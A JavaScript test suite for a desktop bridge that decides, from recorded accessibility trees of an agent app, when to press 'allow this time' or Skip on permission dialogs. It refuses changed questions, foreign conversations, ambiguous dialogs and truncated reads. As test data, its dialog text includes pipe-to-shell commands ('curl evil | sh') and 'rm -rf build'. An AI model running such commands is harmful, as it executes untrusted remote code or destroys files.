// The approval decisions of desktop-ax.js, run from the shipped source on
// recorded accessibility node lists (role, label, depth, and the value of a
// static text), with no app and no osascript.
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import test from 'node:test';

import { AX_SCRIPT_PATH, loadAxDecisions } from '../../scripts/lib/desktop-bridge.mjs';
import { permissionRequest } from '../../scripts/lib/desktop-state.mjs';

const { chooseAnswer, chooseComposer, chooseCopy, chooseStop, dialogs, namedConversation, reply, requireOwn, running, title } = loadAxDecisions();
const TITLE = 'Fake Task - ws - Antigravity';
const OPTIONS = ['1 Yes, allow this time', "2 Yes, and always allow 'curl' in this conversation", "3 Yes, and always allow 'curl'", '4 No (tell the agent what to do instead)'];

const node = (depth, role, label = '', value) => ({ depth, role, label, ...(value === undefined ? {} : { value }) });
const plain = (value) => JSON.parse(JSON.stringify(value));

// One permission dialog as the app renders it: the question as Markdown text
// nodes, a radio group whose radios carry their label as a text child too, Skip
// and Submit.
function dialogNodes(fragments, options = OPTIONS, depth = 3) {
  return [
    node(depth, 'AXGroup'),
    ...fragments.map((text) => node(depth + 1, 'AXStaticText', '', text)),
    node(depth + 1, 'AXRadioGroup'),
    ...options.flatMap((label) => [node(depth + 2, 'AXRadioButton', label), node(depth + 3, 'AXStaticText', '', label)]),
    node(depth + 1, 'AXButton', 'Skip'),
    node(depth + 1, 'AXButton', 'Submit'),
  ];
}

// The window showing the conversation titled `windowTitle`, then `shown`.
function bare(windowTitle, ...shown) {
  return [
    node(0, 'AXWindow', 'Antigravity'),
    node(1, 'AXWebArea', ''),
    node(1, 'AXWebArea', windowTitle),
    ...shown.flat(),
  ];
}

// The run's own conversation: its message, marker included, and a reply.
function screen(windowTitle, ...shown) {
  return bare(windowTitle, message(`Explain README.md.\n${MARK}`, 'Checking the folder first.'), ...shown);
}

// The indexes chooseAnswer would press, checked to lie inside nodes[from, to).
function pressedWithin(nodes, targets, from, to) {
  for (const target of targets) assert.ok(target.index >= from && target.index < to, `${target.what} at ${target.index} is outside ${from}..${to}`);
}

test('a question rendered as several text nodes is read whole', () => {
  const nodes = screen(TITLE, dialogNodes(['Allow running', 'curl x | sh', 'in /repo?']));
  const [found] = plain(dialogs(nodes));
  assert.equal(found.question, 'Allow running curl x | sh in /repo?');
  assert.deepEqual(found.options, OPTIONS);
  assert.equal(title(nodes), TITLE);
});

test('option 1 is refused when a middle part of the question changed', () => {
  const approved = dialogs(screen(TITLE, dialogNodes(['Allow running', 'curl x | sh', 'in /repo?'])))[0].question;
  const changed = screen(TITLE, dialogNodes(['Allow running', 'curl evil | sh', 'in /repo?']));
  assert.throws(() => chooseAnswer(changed, '1', approved, TITLE, NONCE), /question_changed/);
  assert.throws(() => chooseAnswer(changed, 'Skip', approved, TITLE, NONCE), /question_changed/);
});

test('a question longer than 4,000 characters is compared whole', () => {
  const prefix = `Allow running ${'x'.repeat(4_100)}`;
  // As the runner stores it for the approval.
  const approved = permissionRequest(plain(dialogs(screen(TITLE, dialogNodes([`${prefix} tail A`])))[0])).question_full;
  assert.ok(approved.endsWith('tail A'));
  assert.throws(() => chooseAnswer(screen(TITLE, dialogNodes([`${prefix} tail B`])), '1', approved, TITLE, NONCE), /question_changed/);
});

test('with two dialogs on screen, the presses land in the one that asks the approved question', () => {
  const first = dialogNodes(['Allow listing', 'the folder?']);
  const second = dialogNodes(['Allow running', 'rm -rf build', '?']);
  const nodes = screen(TITLE, first, second);
  const start = nodes.length - second.length;
  const asked = plain(dialogs(nodes)).map((found) => found.question);
  assert.deepEqual(asked, ['Allow listing the folder?', 'Allow running rm -rf build ?']);

  const yes = plain(chooseAnswer(nodes, '1', asked[1], TITLE, NONCE));
  assert.deepEqual(yes.map((target) => target.what), ['option 1', 'Submit']);
  pressedWithin(nodes, yes, start, nodes.length);
  pressedWithin(nodes, plain(chooseAnswer(nodes, 'Skip', asked[1], TITLE, NONCE)), start, nodes.length);
  pressedWithin(nodes, plain(chooseAnswer(nodes, '1', asked[0], TITLE, NONCE)), 0, start);
});

test('one group holding two option 1 radios is refused as ambiguous', () => {
  const merged = dialogNodes(['Allow running ls?'], [...OPTIONS, '1 Yes, allow this time']);
  assert.throws(() => chooseAnswer(screen(TITLE, merged), '1', 'Allow running ls?', TITLE, NONCE), /several_dialogs/);
});

test('another conversation on screen refuses every answer', () => {
  const nodes = screen('Other Chat - ws - Antigravity', dialogNodes(['Allow running ls?']));
  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', TITLE, NONCE), /other_conversation/);
  assert.throws(() => chooseAnswer(nodes, 'Skip', 'Allow running ls?', TITLE, NONCE), /other_conversation/);
});

test('option 1 is refused unless its label is exactly "allow this time"', () => {
  const nodes = screen(TITLE, dialogNodes(['Allow running ls?'], ["1 Yes, and always allow 'ls'", ...OPTIONS.slice(1)]));
  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', TITLE, NONCE), /not_found: option 1/);
});

test('only option 1 or Skip is ever chosen, and only with the question and title', () => {
  const nodes = screen(TITLE, dialogNodes(['Allow running ls?']));
  for (const option of ['2', '3', '4', 'Submit', '']) assert.throws(() => chooseAnswer(nodes, option, 'Allow running ls?', TITLE, NONCE), /only 1 or Skip/);
  assert.throws(() => chooseAnswer(nodes, '1', undefined, TITLE, NONCE), /usage/);
  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', undefined, NONCE), /usage/);
  assert.throws(() => chooseAnswer(screen(TITLE), '1', 'Allow running ls?', TITLE, NONCE), /not_found: permission dialog/);
});

// The window as Send reads it: the sidebar of project ws listing `names`, and
// the conversation's web area titled `windowTitle`, showing `shown`.
const sidebar = (windowTitle, names, ...shown) => [
  node(0, 'AXWindow', 'Antigravity'),
  node(1, 'AXWebArea', ''),
  node(2, 'AXButton', 'ws'),
  node(2, 'AXLink', 'New Conversation in Project'),
  ...names.map((name) => node(2, 'AXStaticText', '', name)),
  node(1, 'AXWebArea', windowTitle),
  ...shown.flat(),
];

test('after Send a titled conversation is adopted only when it shows the run\'s own message', () => {
  const mine = message(`Explain README.md.\n${MARK}`);
  assert.equal(namedConversation(sidebar('Antigravity', ['Other Chat'], mine), 'Antigravity', 'ws', NONCE), null, 'not titled yet');
  assert.deepEqual(plain(namedConversation(sidebar(TITLE, ['Other Chat', 'Fake Task'], mine), 'Antigravity', 'ws', NONCE)), { title: TITLE });
  // A new conversation the user created and the app titled meanwhile: newly listed, but not the run's message.
  assert.equal(namedConversation(sidebar('Rival Chat - ws - Antigravity', ['Other Chat', 'Rival Chat'], message('Another task.')), 'Antigravity', 'ws', NONCE), null);
  // Nor a namesake, nor one where only the agent repeats the marker, nor one whose message the tree does not show.
  assert.equal(namedConversation(sidebar(TITLE, ['Fake Task', 'Fake Task'], message('Another task.')), 'Antigravity', 'ws', NONCE), null);
  assert.equal(namedConversation(sidebar(TITLE, ['Fake Task'], message('Another task.', MARK)), 'Antigravity', 'ws', NONCE), null);
  assert.equal(namedConversation(sidebar(TITLE, ['Fake Task']), 'Antigravity', 'ws', NONCE), null);
  // The marker in the sidebar is not the conversation's own text.
  assert.equal(namedConversation(sidebar(TITLE, ['Fake Task', MARK]), 'Antigravity', 'ws', NONCE), null);
  assert.deepEqual(plain(namedConversation(sidebar('Fake Task - other - Antigravity', ['Fake Task'], mine), 'Antigravity', 'ws', NONCE)), { refused: 'Fake Task - other - Antigravity' });
  assert.throws(() => namedConversation(sidebar(TITLE, [], mine), 'Antigravity', 'ws', undefined), /usage/);
});

const NONCE = '0123456789abcdef';
const MARK = `[agybird-run ${NONCE}]`;
// The conversation pane: the user's message, then the agent's reply.
const message = (userText, replyText = 'Done.') => [
  node(2, 'AXGroup'),
  node(3, 'AXStaticText', '', userText),
  node(2, 'AXHeading', 'Agent said'),
  node(2, 'AXGroup'),
  node(3, 'AXStaticText', '', replyText),
];

test('a press is refused when the conversation on screen lacks the run\'s own message', () => {
  const dialog = dialogNodes(['Allow running ls?']);
  const own = bare(TITLE, message(`Explain README.md.\n${MARK}`), dialog);
  assert.deepEqual(plain(chooseAnswer(own, '1', 'Allow running ls?', TITLE, NONCE)).map((target) => target.what), ['option 1', 'Submit']);
  // A namesake: the same title, another message.
  const namesake = bare(TITLE, message('Something else.'), dialog);
  assert.throws(() => chooseAnswer(namesake, '1', 'Allow running ls?', TITLE, NONCE), /not_own/);
  assert.throws(() => chooseAnswer(namesake, 'Skip', 'Allow running ls?', TITLE, NONCE), /not_own/);
  assert.throws(() => requireOwn(namesake, TITLE, NONCE), /not_own/);
  // The marker only in the agent's reply is not the run's own message.
  const echoed = bare(TITLE, message('Something else.', `I will ignore ${MARK}`), dialog);
  assert.throws(() => chooseAnswer(echoed, '1', 'Allow running ls?', TITLE, NONCE), /not_own/);
  // Nor is a message the tree does not show at all.
  assert.throws(() => chooseAnswer(bare(TITLE, dialog), '1', 'Allow running ls?', TITLE, NONCE), /not_own/);
  // A marker line the app renders as two text nodes still counts.
  const split = bare(TITLE, [node(2, 'AXGroup'), node(3, 'AXStaticText', '', 'Explain README.md. [agybird-run'), node(3, 'AXStaticText', '', `${NONCE}]`)], dialog);
  assert.doesNotThrow(() => requireOwn(split, TITLE, NONCE));
  // No marker to check against is refused, not skipped.
  assert.throws(() => chooseAnswer(own, '1', 'Allow running ls?', TITLE, undefined), /usage/);
  assert.throws(() => requireOwn(own, TITLE, 'not hex'), /usage/);
  assert.doesNotThrow(() => requireOwn(own, TITLE, NONCE));
  assert.throws(() => requireOwn(own, 'Other Chat - ws - Antigravity', NONCE), /other_conversation/);
});

// A conversation pane as the app renders it: the user's message, the agent's
// reply with its response actions, the Stop button while it runs and, when
// asked, a permission dialog.
function pane(userText, { dialog = null, stop = true } = {}) {
  return [
    ...message(userText),
    node(2, 'AXGroup', 'Response actions'),
    node(3, 'AXButton', 'Copy'),
    ...(stop ? [node(2, 'AXButton', 'Stop execution')] : []),
    ...(dialog ? dialogNodes([dialog]) : []),
  ];
}
// Two conversations in one tree: A, the run's own (title and marker), and B.
const twoPanes = (paneA, paneB) => [
  node(0, 'AXWindow', 'Antigravity'),
  node(1, 'AXWebArea', ''),
  node(1, 'AXWebArea', TITLE),
  ...paneA,
  node(0, 'AXWindow', 'Antigravity'),
  node(1, 'AXWebArea', 'Second Chat - ws - Antigravity'),
  ...paneB,
];

test('with two conversation panes, an answer matching only the other pane\'s dialog is refused', () => {
  const nodes = twoPanes(pane(`Explain README.md.\n${MARK}`, { stop: false }), pane('Another task.', { dialog: 'Allow running ls?', stop: false }));
  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', TITLE, NONCE), /several_conversations/);
  assert.throws(() => chooseAnswer(nodes, 'Skip', 'Allow running ls?', TITLE, NONCE), /several_conversations/);
  assert.throws(() => dialogs(nodes), /several_conversations/);
  assert.throws(() => title(nodes), /several_conversations/);
});

test('with two conversation panes, Stop, Copy and the reply are never taken from either', () => {
  const nodes = twoPanes(message(`Explain README.md.\n${MARK}`), pane('Another task.'));
  assert.throws(() => chooseStop(nodes, TITLE, NONCE), /several_conversations/);
  assert.throws(() => chooseCopy(nodes, TITLE, NONCE), /several_conversations/);
  assert.throws(() => running(nodes), /several_conversations/);
  assert.throws(() => reply(nodes), /several_conversations/);
});

test('a dialog, Stop, Copy or reply outside the verified conversation is refused, not pressed', () => {
  // One titled conversation, the run's own, and the controls in the untitled web area beside it.
  const outside = [
    node(0, 'AXWindow', 'Antigravity'),
    node(1, 'AXWebArea', ''),
    ...pane('Another task.', { dialog: 'Allow running ls?' }),
    node(1, 'AXWebArea', TITLE),
    ...message(`Explain README.md.\n${MARK}`),
  ];
  assert.throws(() => chooseAnswer(outside, '1', 'Allow running ls?', TITLE, NONCE), /outside_conversation/);
  assert.throws(() => chooseAnswer(outside, 'Skip', 'Allow running ls?', TITLE, NONCE), /outside_conversation/);
  assert.throws(() => chooseStop(outside, TITLE, NONCE), /outside_conversation/);
  assert.throws(() => chooseCopy(outside, TITLE, NONCE), /outside_conversation/);
  assert.throws(() => running(outside), /outside_conversation/);
  // Inside the conversation but missing: not found, nothing pressed.
  const bareOwn = bare(TITLE, message(`Explain README.md.\n${MARK}`));
  assert.throws(() => chooseStop(bareOwn, TITLE, NONCE), /not_found: Stop execution/);
  assert.throws(() => chooseCopy(bareOwn, TITLE, NONCE), /not_found: Response actions/);
  assert.equal(running(bareOwn), false);
});

test('a single conversation pane still yields its dialog, Stop, Copy and reply, all inside it', () => {
  const nodes = bare(TITLE, pane(`Explain README.md.\n${MARK}`, { dialog: 'Allow running ls?' }));
  const start = nodes.findIndex((entry) => entry.role === 'AXWebArea' && entry.label === TITLE);
  assert.deepEqual(plain(chooseAnswer(nodes, '1', 'Allow running ls?', TITLE, NONCE)).map((target) => target.what), ['option 1', 'Submit']);
  pressedWithin(nodes, plain(chooseAnswer(nodes, 'Skip', 'Allow running ls?', TITLE, NONCE)), start + 1, nodes.length);
  const stop = chooseStop(nodes, TITLE, NONCE);
  assert.equal(nodes[stop].label, 'Stop execution');
  const copy = chooseCopy(nodes, TITLE, NONCE);
  assert.equal(nodes[copy].label, 'Copy');
  assert.ok(stop > start && copy > start);
  assert.equal(running(nodes), true);
  assert.equal(reply(nodes), 'Done.');
  assert.equal(title(nodes), TITLE);
  // Stop and Copy check the conversation as an answer does.
  assert.throws(() => chooseStop(nodes, 'Other Chat - ws - Antigravity', NONCE), /other_conversation/);
  assert.throws(() => chooseCopy(bare(TITLE, pane('Something else.')), TITLE, NONCE), /not_own/);
});

// The composer and Send of a pane, as the app renders them below the conversation.
const composerNodes = (depth = 2) => [node(depth, 'AXTextArea', 'Message input'), node(depth, 'AXButton', 'Send message')];
const CONTROLS = ['Message input', 'Send message'];

test('with two panes holding composers, the composer and Send are taken from neither', () => {
  // The run's new, untitled conversation, and an unlabelled pane before it with its own composer.
  const untitledRival = [
    node(0, 'AXWindow', 'Antigravity'),
    node(1, 'AXWebArea', ''),
    ...composerNodes(),
    node(1, 'AXWebArea', 'Antigravity'),
    ...composerNodes(),
  ];
  for (const control of CONTROLS) assert.throws(() => chooseComposer(untitledRival, 'Antigravity', control), new RegExp(`outside_conversation: ${control}`));
  // Once titled, a second titled pane with a composer refuses both as well.
  const titled = twoPanes([...message(`Explain README.md.\n${MARK}`), ...composerNodes()], [...message('Another task.'), ...composerNodes()]);
  for (const control of CONTROLS) assert.throws(() => chooseComposer(titled, TITLE, control), /several_conversations/);
});

test('the run\'s composer or Send outside the conversation web area is refused', () => {
  // The only composer sits in the window beside the web area, not inside it.
  const beside = [node(0, 'AXWindow', 'Antigravity'), node(1, 'AXWebArea', ''), node(1, 'AXWebArea', 'Antigravity'), node(2, 'AXGroup'), ...composerNodes(1)];
  for (const control of CONTROLS) assert.throws(() => chooseComposer(beside, 'Antigravity', control), new RegExp(`outside_conversation: ${control}`));
  // Two inside the one conversation cannot say which is the run's either.
  const doubled = bare('Antigravity', composerNodes(), composerNodes());
  for (const control of CONTROLS) assert.throws(() => chooseComposer(doubled, 'Antigravity', control), new RegExp(`several_controls: ${control}`));
});

test('a single pane still yields its composer and Send, inside it', () => {
  for (const shownTitle of ['Antigravity', TITLE]) {
    const nodes = bare(shownTitle, shownTitle === TITLE ? message(`Explain README.md.\n${MARK}`) : [], composerNodes());
    const start = nodes.findIndex((entry) => entry.role === 'AXWebArea' && entry.label === shownTitle);
    for (const control of CONTROLS) {
      const index = chooseComposer(nodes, shownTitle, control);
      assert.equal(nodes[index].label, control);
      assert.ok(index > start);
    }
    // Another conversation on screen refuses both; none there yet is -1, so Send can wait for it.
    assert.throws(() => chooseComposer(nodes, 'Other Chat - ws - Antigravity', 'Message input'), /other_conversation/);
  }
  assert.equal(chooseComposer(bare('Antigravity', [node(2, 'AXTextArea', 'Message input')]), 'Antigravity', 'Send message'), -1);
  assert.throws(() => chooseComposer(bare('Antigravity', composerNodes()), 'Antigravity', 'Stop execution'), /usage/);
});

// A tree read that stopped at its node cap before the end, as walk() marks it.
const cut = (nodes) => Object.assign(nodes, { truncated: true });

test('a tree read cut off at the node cap is never trusted as the whole app', () => {
  const full = () => bare(TITLE, pane(`Explain README.md.\n${MARK}`, { dialog: 'Allow running ls?' }));
  const nodes = cut(full());
  // What lies past the cut cannot be ruled out: a second conversation, a
  // rival composer or Send, the Stop that says the turn still runs, the rest
  // of the reply. So nothing is read, chosen or pressed on such a read.
  for (const read of [() => title(nodes), () => running(nodes), () => reply(nodes), () => dialogs(nodes), () => requireOwn(nodes, TITLE, NONCE)]) assert.throws(read, /^Error: truncated/);
  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', TITLE, NONCE), /truncated/);
  assert.throws(() => chooseAnswer(nodes, 'Skip', 'Allow running ls?', TITLE, NONCE), /truncated/);
  assert.throws(() => chooseStop(nodes, TITLE, NONCE), /truncated/);
  assert.throws(() => chooseCopy(nodes, TITLE, NONCE), /truncated/);
  for (const control of CONTROLS) assert.throws(() => chooseComposer(cut(bare('Antigravity', composerNodes())), 'Antigravity', control), /truncated/);
  assert.throws(() => namedConversation(cut(bare(TITLE, message(`Explain README.md.\n${MARK}`))), 'Antigravity', 'ws', NONCE), /truncated/);
  // A turn whose Stop lies past the cut does not read as ended.
  assert.throws(() => running(cut(bare(TITLE, pane(`Explain README.md.\n${MARK}`, { stop: false })))), /truncated/);
  // The same trees read whole still decide as before.
  const whole = full();
  assert.equal(running(whole), true);
  assert.equal(whole[chooseStop(whole, TITLE, NONCE)].label, 'Stop execution');
  for (const control of CONTROLS) assert.equal(bare('Antigravity', composerNodes())[chooseComposer(bare('Antigravity', composerNodes()), 'Antigravity', control)].label, control);
});

test('the decisions region calls no accessibility API', () => {
  const source = readFileSync(AX_SCRIPT_PATH, 'utf8');
  const region = source.slice(source.indexOf('// desktop-decisions:start'), source.indexOf('// desktop-decisions:end'));
  assert.ok(region.length > 0);
  assert.doesNotMatch(region, /\$[.(]|ObjC|Application\(|delay\(/);
});
